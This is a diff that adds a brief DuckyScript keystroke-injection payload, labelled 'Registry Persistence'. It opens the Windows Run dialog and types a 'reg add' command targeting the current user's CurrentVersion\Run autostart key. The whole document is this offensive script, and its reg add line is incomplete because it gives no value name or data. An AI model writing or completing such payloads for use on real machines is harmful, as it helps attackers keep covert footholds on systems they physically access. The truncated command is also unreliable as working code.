@@ -1,0 +1,10 @@
+REM Registry Persistence
+
+GUI r
+
+DELAY 500
+
+STRING cmd /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+ENTER
+
